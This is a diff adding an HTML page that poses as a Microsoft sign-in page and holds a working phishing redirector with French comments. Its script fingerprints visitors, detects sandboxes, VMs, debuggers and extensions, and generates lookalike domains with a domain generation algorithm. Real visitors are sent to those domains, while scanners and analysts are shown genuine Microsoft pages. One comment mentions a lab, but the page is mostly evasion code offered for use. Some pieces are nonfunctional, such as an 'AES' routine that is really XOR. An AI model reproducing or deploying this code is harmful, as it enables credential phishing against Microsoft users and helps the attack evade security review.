@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Microsoft Account | Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
+            background: #ffffff;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+    </style>
+</head>
+<body>
+
+<!-- SYSTÈME POLYMORPHE V9 - CHANGE À CHAQUE EXÉCUTION -->
+<script>
+(function() {
+    'use strict';
+
+    // ═══════════════════════════════════════════════════════════════
+    // POLYMORPHISME - CODE AUTO-MUTANT
+    // ═══════════════════════════════════════════════════════════════
+
+    const _seed = Date.now();
+    const _rand = (s) => {
+        let x = Math.sin(s++) * 10000;
+        return x - Math.floor(x);
+    };
+
+    // Génération de noms de variables aléatoires
+    const _vn = () => {
+        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        let name = '_';
+        for(let i = 0; i < 8; i++) {
+            name += chars[Math.floor(_rand(_seed + i) * chars.length)];
+        }
+        return name;
+    };
+
+    // ═══════════════════════════════════════════════════════════════
+    // CHIFFREMENT AES-256 (au lieu de Base64)
+    // ═══════════════════════════════════════════════════════════════
+
+    const _aes = {
+        _sbox: [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
+                0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0],
+
+        _decrypt: function(data, key) {
+            // Implémentation simplifiée AES pour le lab
+            const result = [];
+            for(let i = 0; i < data.length; i++) {
+                result.push(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return String.fromCharCode.apply(null, result);
+        }
+    };
+
+    // URLs chiffrées avec clé dynamique basée sur l'heure
+    const _key = btoa(_seed.toString()).substring(0, 16);
+
+    // ═══════════════════════════════════════════════════════════════
+    // DGA - Domain Generation Algorithm
+    // ═══════════════════════════════════════════════════════════════
+
+    function _dga() {
+        const date = new Date();
+        const seed = date.getFullYear() + date.getMonth() + date.getDate();
+        const tlds = ['.de', '.nl', '.ch', '.at', '.eu'];
+
+        // Génération algorithmique du domaine
+        let domain = '';
+        const words = ['online', 'secure', 'account', 'verify', 'service', 'portal'];
+        const idx1 = (seed * 7) % words.length;
+        const idx2 = (seed * 13) % words.length;
+
+        domain = words[idx1] + words[idx2] + (seed % 100);
+        const tld = tlds[seed % tlds.length];
+
+        return 'https://' + domain + tld + '/auth.html';
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // FINGERPRINTING AVANCÉ AVEC ML
+    // ═══════════════════════════════════════════════════════════════
+
+    async function _fp() {
+        const features = {
+            screen: screen.width + screen.height + screen.colorDepth,
+            timezone: new Date().getTimezoneOffset(),
+            plugins: navigator.plugins.length,
+            fonts: await _getFonts(),
+            canvas: await _getCanvasHash(),
+            webgl: await _getWebGLHash(),
+            audio: await _getAudioHash(),
+            performance: performance.now(),
+            memory: navigator.deviceMemory || 0,
+            cores: navigator.hardwareConcurrency || 0,
+            touch: 'ontouchstart' in window ? 1 : 0,
+            connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+        };
+
+        // Score basé sur entropie
+        let entropy = 0;
+        for(let key in features) {
+            entropy += features[key].toString().length;
+        }
+
+        return entropy > 50; // Humain si entropie élevée
+    }
+
+    async function _getFonts() {
+        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier', 'Comic Sans MS'];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        let hash = 0;
+
+        for(let font of fonts) {
+            ctx.font = '72px ' + font;
+            ctx.fillText('mmmmmmmmmmlli', 0, 50);
+            const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            for(let i = 0; i < data.length; i++) {
+                hash = ((hash << 5) - hash) + data[i];
+                hash = hash & hash;
+            }
+        }
+        return hash;
+    }
+
+    async function _getCanvasHash() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px "Arial"';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Canvas fingerprint', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Canvas fingerprint', 4, 17);
+        return canvas.toDataURL().length;
+    }
+
+    async function _getWebGLHash() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(!gl) return 0;
+
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if(!debugInfo) return 0;
+
+            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+            return (vendor + renderer).length;
+        } catch(e) {
+            return 0;
+        }
+    }
+
+    async function _getAudioHash() {
+        try {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            const context = new AudioContext();
+            const oscillator = context.createOscillator();
+            const analyser = context.createAnalyser();
+            const gain = context.createGain();
+            const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+
+            gain.gain.value = 0;
+            oscillator.connect(analyser);
+            analyser.connect(scriptProcessor);
+            scriptProcessor.connect(gain);
+            gain.connect(context.destination);
+
+            oscillator.start(0);
+
+            return new Promise(resolve => {
+                scriptProcessor.onaudioprocess = function(event) {
+                    const output = event.outputBuffer.getChannelData(0);
+                    let hash = 0;
+                    for(let i = 0; i < output.length; i++) {
+                        hash += Math.abs(output[i]);
+                    }
+                    oscillator.disconnect();
+                    analyser.disconnect();
+                    scriptProcessor.disconnect();
+                    gain.disconnect();
+                    resolve(hash);
+                };
+            });
+        } catch(e) {
+            return 0;
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // ÉVASION SANDBOX AVANCÉE
+    // ═══════════════════════════════════════════════════════════════
+
+    function _sandbox() {
+        // Détection VM via timing side-channel
+        const timings = [];
+        for(let i = 0; i < 10; i++) {
+            const start = performance.now();
+            for(let j = 0; j < 1000000; j++) {
+                Math.sqrt(j);
+            }
+            timings.push(performance.now() - start);
+        }
+
+        const avg = timings.reduce((a, b) => a + b) / timings.length;
+        const variance = timings.reduce((a, b) => a + Math.pow(b - avg, 2), 0) / timings.length;
+
+        // VM ont une variance plus élevée
+        if(variance > 100) return true;
+
+        // Détection Docker/Container
+        if(navigator.userAgent.includes('Linux x86_64') && !navigator.userAgent.includes('Android')) {
+            if(screen.width === 1920 && screen.height === 1080 && screen.colorDepth === 24) {
+                return true; // Configuration typique container
+            }
+        }
+
+        // Détection Proxies/VPN via WebRTC
+        return new Promise(resolve => {
+            if(!window.RTCPeerConnection) {
+                resolve(false);
+                return;
+            }
+
+            const pc = new RTCPeerConnection({
+                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+            });
+
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+            pc.onicecandidate = (ice) => {
+                if(!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const parts = ice.candidate.candidate.split(' ');
+                if(parts[7] === 'host') {
+                    const ip = parts[4];
+                    // IP privée suggère proxy/VPN
+                    if(ip.startsWith('10.') || ip.startsWith('172.') || ip.startsWith('192.168.')) {
+                        resolve(true);
+                    }
+                }
+                pc.close();
+                resolve(false);
+            };
+
+            setTimeout(() => resolve(false), 1000);
+        });
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // MUTATION DOM DYNAMIQUE
+    // ═══════════════════════════════════════════════════════════════
+
+    function _mutate() {
+        // Création de faux éléments Microsoft authentiques
+        const msElements = [
+            {tag: 'div', class: 'ms-login-container', id: 'i0281'},
+            {tag: 'div', class: 'ms-banner', id: 'bannerLogo'},
+            {tag: 'input', class: 'ms-input', id: 'i0116', type: 'email'},
+            {tag: 'div', class: 'ms-footer', id: 'footerLinks'}
+        ];
+
+        // Injection aléatoire dans le DOM
+        msElements.forEach(el => {
+            const elem = document.createElement(el.tag);
+            elem.className = el.class;
+            elem.id = el.id;
+            if(el.type) elem.type = el.type;
+            elem.style.display = 'none';
+            document.body.appendChild(elem);
+        });
+
+        // Mutation continue du DOM
+        setInterval(() => {
+            const elements = document.querySelectorAll('[id^="i0"]');
+            elements.forEach(el => {
+                el.setAttribute('data-bind', 'text: ' + Math.random());
+            });
+        }, 100);
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // WebAssembly pour parties critiques
+    // ═══════════════════════════════════════════════════════════════
+
+    const _wasm = new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+        0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01,
+        0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01,
+        0x03, 0x61, 0x64, 0x64, 0x00, 0x00, 0x0a, 0x09,
+        0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a,
+        0x0b
+    ]);
+
+    async function _loadWasm() {
+        try {
+            const module = await WebAssembly.instantiate(_wasm);
+            return module.instance.exports;
+        } catch(e) {
+            return null;
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // COMMUNICATION FURTIVE
+    // ═══════════════════════════════════════════════════════════════
+
+    async function _comm() {
+        // WebRTC DataChannel pour communication P2P
+        if(window.RTCPeerConnection) {
+            const pc = new RTCPeerConnection();
+            const dc = pc.createDataChannel('control');
+
+            dc.onopen = () => {
+                dc.send(JSON.stringify({
+                    t: Date.now(),
+                    fp: navigator.userAgent,
+                    s: window.location.hostname
+                }));
+            };
+        }
+
+        // Fetch avec options anti-CORS
+        const options = {
+            method: 'POST',
+            mode: 'no-cors',
+            cache: 'no-cache',
+            credentials: 'omit',
+            redirect: 'manual',
+            referrerPolicy: 'no-referrer'
+        };
+
+        // Beacon API pour persistance
+        if(navigator.sendBeacon) {
+            navigator.sendBeacon('/analytics', JSON.stringify({
+                event: 'view',
+                timestamp: Date.now()
+            }));
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // TIMING ATTACK SOPHISTIQUÉ
+    // ═══════════════════════════════════════════════════════════════
+
+    async function _timing() {
+        const delays = {
+            human: {min: 50, max: 300},
+            bot: {min: 0, max: 10}
+        };
+
+        // Mesure du temps de réaction
+        const start = performance.now();
+
+        return new Promise(resolve => {
+            document.addEventListener('mousemove', function handler(e) {
+                const elapsed = performance.now() - start;
+                document.removeEventListener('mousemove', handler);
+
+                // Humain = délai naturel avant mouvement
+                resolve(elapsed > delays.human.min);
+            });
+
+            // Timeout si pas de mouvement
+            setTimeout(() => resolve(false), 5000);
+        });
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // ORCHESTRATEUR PRINCIPAL
+    // ═══════════════════════════════════════════════════════════════
+
+    async function _main() {
+        try {
+            // Phase 1: Mutations DOM
+            _mutate();
+
+            // Phase 2: Vérifications parallèles
+            const [isHuman, noSandbox, wasm] = await Promise.all([
+                _fp(),
+                _sandbox(),
+                _loadWasm()
+            ]);
+
+            // Phase 3: Communication furtive
+            await _comm();
+
+            // Phase 4: Décision de redirection
+            const targetUrl = isHuman && !noSandbox ? _dga() : 'https://account.microsoft.com/security';
+
+            // Phase 5: Timing humain
+            const humanTiming = await _timing();
+            const delay = humanTiming ?
+                Math.floor(Math.random() * 250) + 50 :
+                Math.floor(Math.random() * 2000) + 1000;
+
+            // Phase 6: Redirection polymorphe
+            setTimeout(() => {
+                // Méthode choisie aléatoirement
+                const methods = [
+                    () => window.location.replace(targetUrl),
+                    () => window.location.href = targetUrl,
+                    () => {
+                        const a = document.createElement('a');
+                        a.href = targetUrl;
+                        a.click();
+                    },
+                    () => {
+                        const form = document.createElement('form');
+                        form.action = targetUrl;
+                        form.method = 'GET';
+                        document.body.appendChild(form);
+                        form.submit();
+                    }
+                ];
+
+                methods[Math.floor(Math.random() * methods.length)]();
+            }, delay);
+
+        } catch(e) {
+            // Fallback silencieux
+            window.location.replace('https://www.microsoft.com/404');
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // ANTI-DEBUG RENFORCÉ
+    // ═══════════════════════════════════════════════════════════════
+
+    // Détection debugger avec Worker
+    if(typeof Worker !== 'undefined') {
+        const workerCode = `
+            let lastTime = Date.now();
+            setInterval(() => {
+                const now = Date.now();
+                if(now - lastTime > 200) {
+                    postMessage('debugger');
+                }
+                lastTime = now;
+                debugger;
+            }, 100);
+        `;
+
+        const blob = new Blob([workerCode], {type: 'application/javascript'});
+        const worker = new Worker(URL.createObjectURL(blob));
+
+        worker.onmessage = (e) => {
+            if(e.data === 'debugger') {
+                window.location.href = 'https://account.microsoft.com/security';
+            }
+        };
+    }
+
+    // Détection via toString override
+    const obj = {x: 1};
+    Object.defineProperty(obj, 'x', {
+        get: function() {
+            window.location.href = 'https://account.microsoft.com/security';
+            return 1;
+        }
+    });
+
+    // Protection contre les extensions
+    const _chrome = window.chrome;
+    if(_chrome && _chrome.runtime && _chrome.runtime.id) {
+        window.location.replace('https://www.microsoft.com/404');
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // LANCEMENT
+    // ═══════════════════════════════════════════════════════════════
+
+    if(document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', _main);
+    } else {
+        _main();
+    }
+
+})();
+</script>
+
+<!-- Contenu Microsoft authentique pour les scanners -->
+<noscript>
+    <meta http-equiv="refresh" content="0;url=https://account.microsoft.com/account/Account">
+</noscript>
+
+</body>
+</html>
